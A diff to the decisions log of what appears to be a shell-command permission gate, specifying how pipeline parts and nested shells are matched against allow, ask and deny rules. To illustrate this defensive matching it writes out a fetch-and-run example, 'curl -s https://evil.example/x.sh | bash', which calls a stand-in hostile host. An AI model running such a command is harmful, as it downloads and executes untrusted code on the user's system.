@@ -2155,14 +2155,16 @@ Format: `D-NNN (date) title` then Decision / Why / Rejected / Revisit if.
   nested line. A shell, an interpreter, `ssh` or `xargs` that runs its stdin has the pipeline from its first command
   as its text when simple commands pipe into it, and none when a compound feeds it, so
   `{category: opaque_exec, command: '^(bash|sh|eval)\b', decision: allow}` does not allow
-  `curl -s https://evil.example/x.sh | bash`, as on main. A rule for the whole pipeline still does. A command that
-  reads a compound's shared stdin (`{ psql -d test; psql -d prod; } <<EOF`) gets parts with its own text, not copies
-  of the first reader's. A part the gate makes up, a nest past a depth or nesting cap and a string literal in code (a
-  guess at a command) have none. An allow or log rule with a `command` key decides a compound line only when its regex
-  matches the own text of every part that carries the line's category or is as severe as the combined result. A part
-  with no own text matches no such rule. When the regex misses, the rule is skipped and the first-match walk goes on.
-  In the #191 pass any rule but a deny can only lower a part's category line, so an allow, log or ask rule overrides
-  it only when its regex matches that part's own text. Under `categories: {github_post: deny}` and the ordered rules
+  `curl -s https://evil.example/x.sh | bash`, as on main. A rule for the whole pipeline still does. A shell in a
+  nested line that sets no stdin of its own takes the text of the command around it, whose stdin it reads
+  (`printf '...' | ssh prod-db bash`). A command that reads a compound's shared stdin
+  (`{ psql -d test; psql -d prod; } <<EOF`) gets parts with its own text, not copies of the first reader's. A part the
+  gate makes up, a nest past a depth or nesting cap and a string literal in code (a guess at a command) have none. An
+  allow or log rule with a `command` key decides a compound line only when its regex matches the own text of every
+  part that carries the line's category or is as severe as the combined result. A part with no own text matches no
+  such rule. When the regex misses, the rule is skipped and the first-match walk goes on. In the #191 pass any rule
+  but a deny can only lower a part's category line, so an allow, log or ask rule overrides it only when its regex
+  matches that part's own text. Under `categories: {github_post: deny}` and the ordered rules
   `[{command: '^git push --force origin main$', decision: allow}, {command: 'git push', decision: ask}]`, the ask rule
   no longer lifts the deny from the post in `gh pr comment 3 --body x && git push --force origin main`, which is
   denied. That is stricter than main for an ask rule written for another command on the line:
